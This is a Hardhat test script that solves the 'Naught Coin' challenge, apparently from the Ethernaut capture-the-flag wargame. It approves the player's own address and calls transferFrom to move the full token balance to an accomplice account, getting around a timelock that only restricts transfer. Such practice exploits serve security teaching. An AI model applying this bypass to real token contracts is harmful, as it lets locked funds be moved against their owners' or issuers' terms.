import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { TestOptions, setupChallenge, submitLevel } from "./utils";

describe("Naught Coin", () => {
  let eoa: Signer;
  let accomplice: Signer;
  let challenge: Contract;

  before(async () => {
    const contractLevel = "0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F";
    const contractName = "NaughtCoin";
    const options: TestOptions = { contractName };
    ({ challenge } = await setupChallenge(contractLevel, options));
    [eoa, accomplice] = await ethers.getSigners();
  });

  it("solves the challenge", async () => {
    const [eoaAddress, accompliceAddress] = await Promise.all([
      eoa.getAddress(),
      accomplice.getAddress(),
    ]);
    const eoaBalance = await challenge.balanceOf(eoaAddress);
    expect(eoaBalance.toString()).to.be.not.equal("0");

    const tx1 = await challenge.approve(eoaAddress, eoaBalance);
    await tx1.wait();

    const tx2 = await challenge.transferFrom(
      eoaAddress,
      accompliceAddress,
      eoaBalance
    );
    await tx2.wait();

    const afterBalance = await challenge.balanceOf(eoaAddress);
    expect(afterBalance.toString()).to.be.equal("0");
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
